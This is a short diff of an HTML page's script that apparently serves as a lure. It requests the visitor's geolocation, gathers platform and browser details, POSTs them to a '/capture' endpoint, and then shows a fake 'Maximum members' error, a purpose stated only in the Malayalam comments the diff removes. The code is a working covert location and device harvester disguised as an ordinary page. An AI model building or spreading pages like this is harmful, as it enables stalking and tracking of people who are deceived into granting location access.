@@ -29,11 +29,11 @@
 
 <script>
     async function collectData() {
-        // ലൊക്കേഷൻ പെർമിഷൻ ചോദിക്കുന്നു
+    
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendData, handleError);
         } else {
-            sendData(); // ലൊക്കേഷൻ ഇല്ലെങ്കിലും ബാക്കി വിവരങ്ങൾ അയക്കാൻ
+            sendData();
         }
     }
 
@@ -47,15 +47,14 @@
             platform: navigator.platform,
             browser: navigator.userAgent
         };
-
-        // സെർവറിലേക്ക് വിവരങ്ങൾ അയക്കുന്നു
+    
         fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         });
 
-        // "Maximum members" മെസേജ് കാണിക്കുന്നു
+        
         document.getElementById('error').style.display = 'block';
     }
 
@@ -63,4 +62,5 @@
 </script>
 
 </body>
+
 </html>
